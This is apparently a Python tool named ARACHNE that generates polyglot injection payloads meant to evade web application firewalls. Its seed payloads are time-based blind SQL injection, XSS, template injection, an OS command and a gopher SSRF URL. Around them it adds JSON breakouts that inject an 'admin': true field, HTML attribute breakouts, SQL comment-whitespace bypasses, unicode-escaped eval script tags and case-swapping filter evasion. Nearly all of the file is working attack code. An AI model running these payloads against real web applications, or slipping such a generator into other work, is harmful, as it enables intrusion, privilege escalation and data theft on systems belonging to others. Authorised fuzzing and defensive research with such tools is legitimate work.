#!/usr/bin/env python3
"""
ARACHNE - Polyglot Payload Genius
Generates context-aware, WAF-busting polyglot payloads for injection testing.
"""
import random
import json
from dataclasses import dataclass
from enum import Enum
from typing import List, Dict, Any, Optional

class PayloadContext(Enum):
    """The syntactic context the payload must survive within."""
    URL_PARAM = "url_param"
    JSON_BODY = "json_body"
    XML_BODY = "xml_body"
    HTML_ATTR = "html_attribute"
    DIRECT_SQL = "direct_sql"
    SCRIPT_TAG = "script_tag"

@dataclass
class PolyglotSeed:
    """Base ingredients for a polyglot."""
    sql_injection: str
    xss_script: str
    ssti_payload: str
    os_command: str
    ssrf_protocol: str

class PolyglotGenius:
    """
    Crafts payloads that are valid in multiple contexts simultaneously.
    Think of it as grammatical warfare.
    """

    def __init__(self, seed: Optional[PolyglotSeed] = None):
        self.seed = seed or self._default_seed()
        # Encodings and wrappers to bypass naive filtering
        self.wrappers = {
            'json': ['{}', '[]', '{"data":"%s"}', '[%s]'],
            'xml': ['<!--%s-->', '<![CDATA[%s]]>', '<x>%s</x>'],
            'url': ['%s', '%2525s', '%%s'],
            'html': ['" onmouseover="%s', "'><script>%s</script>", '<img src=x onerror="%s">']
        }
        self.encodings = ['utf-8', 'utf-16be', 'utf-16le', 'ibm037']
        self.comment_syntax = {
            'sql': ['--', '/*', '#', '-- -'],
            'html': ['<!--', '-->'],
            'js': ['//', '/*', '*/'],
            'generic': [';', '|', '&', '\\n']
        }

    def _default_seed(self) -> PolyglotSeed:
        return PolyglotSeed(
            sql_injection="1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
            xss_script="alert(document.domain)",
            ssti_payload="{{7*7}}",
            os_command="sleep 5",
            ssrf_protocol="gopher://127.0.0.1:80/_GET%20/index"
        )

    def _nest_payloads(self, core: str) -> str:
        """Recursively wraps a payload in valid syntax from different contexts."""
        # Example: A JSON string containing an HTML comment holding a SQL injection
        wrappers = [
            lambda p: f'{{"x":"{p}"}}',  # JSON
            lambda p: f'<!--{p}-->',      # HTML comment
            lambda p: f'/*{p}*/',         # JS/C comment
            lambda p: f'`{p}`',           # JS template literal
            lambda p: f'%({p})s',         # Python format string
        ]
        working_payload = core
        # Apply 2-3 random wrappers
        for _ in range(random.randint(2, 3)):
            wrapper = random.choice(wrappers)
            working_payload = wrapper(working_payload)
        return working_payload

    def craft_for_context(self, context: PayloadContext, target_hint: Optional[str] = None) -> List[str]:
        """
        Generates a list of polyglot payloads tailored for a specific context.
        target_hint: A string like 'PHP', 'Node', 'Java' to tailor the payload.
        """
        payloads = []

        # Base malicious intent selection
        if target_hint and 'sql' in target_hint.lower():
            base_intent = self.seed.sql_injection
        elif target_hint and 'template' in target_hint.lower():
            base_intent = self.seed.ssti_payload
        else:
            # Default to a hybrid
            base_intent = random.choice([self.seed.sql_injection, self.seed.xss_script, self.seed.ssti_payload])

        # 1. Simple encoded variant
        encoded = base_intent.encode('utf-16be').decode('latin-1', errors='ignore')
        payloads.append(encoded)

        # 2. Nested polyglot variant
        nested = self._nest_payloads(base_intent)
        payloads.append(nested)

        # 3. Context-specific chameleon
        if context == PayloadContext.JSON_BODY:
            # Make it look like a benign JSON value
            chameleon = f'", "admin": true, "{random.randint(1000,9999)}": "{base_intent}'
            # Wrap it to close the JSON structure
            chameleon = '{"user": "' + chameleon + '"}'
            payloads.append(chameleon)
        elif context == PayloadContext.URL_PARAM:
            # Embed in URL encoding and add a benign fragment
            chameleon = f"id=1{random.choice(['&', ';'])}action=view{random.choice(['&', ';'])}payload={base_intent}#section1"
            payloads.append(chameleon)
        elif context == PayloadContext.HTML_ATTR:
            # Break out of attribute, execute, then reconstruct valid HTML
            chameleon = f'" onfocus="{base_intent}" autofocus="'
            payloads.append(chameleon)
        elif context == PayloadContext.DIRECT_SQL:
            # Use alternative whitespace and inline comments
            chameleon = base_intent.replace(' ', '/**/')
            chameleon = chameleon + random.choice(self.comment_syntax['sql'])
            payloads.append(chameleon)
        elif context == PayloadContext.SCRIPT_TAG:
            # Use JSfuck style obfuscation or unicode escapes
            simple_obfuscate = ''.join([f'\\u{ord(c):04x}' for c in base_intent[:10]])
            chameleon = f'<script>eval("{simple_obfuscate}")</script>'
            payloads.append(chameleon)

        # 4. Add a completely random, mutated beast
        beast = base_intent
        # Insert random comments
        for _ in range(random.randint(1, 3)):
            insert_pos = random.randint(0, len(beast))
            comment = random.choice(self.comment_syntax['generic'])
            beast = beast[:insert_pos] + comment + beast[insert_pos:]
        # Randomly change case in parts (bypasses case-sensitive filters)
        beast_list = list(beast)
        for i in range(len(beast_list)):
            if random.random() > 0.7:
                beast_list[i] = beast_list[i].swapcase()
        beast = ''.join(beast_list)
        payloads.append(beast)

        return payloads

    def generate_batch(self, count: int = 10) -> Dict[PayloadContext, List[str]]:
        """Generate a batch of payloads across all contexts for wide-spectrum fuzzing."""
        batch = {}
        for ctx in PayloadContext:
            batch[ctx] = []
            for _ in range(max(1, count // len(PayloadContext))):
                batch[ctx].extend(self.craft_for_context(ctx))
            # Deduplicate while preserving order
            seen = set()
            batch[ctx] = [p for p in batch[ctx] if not (p in seen or seen.add(p))]
        return batch


# Quick CLI test
if __name__ == "__main__":
    print("[*] Spawning Polyglot Genius...")
    pg = PolyglotGenius()
    batch = pg.generate_batch(5)
    for ctx, payload_list in batch.items():
        print(f"\n[*] Context: {ctx.value}")
        for i, p in enumerate(payload_list[:2]):  # Show first two per context
            print(f"  {i+1}. {p[:80]}..." if len(p) > 80 else f"  {i+1}. {p}")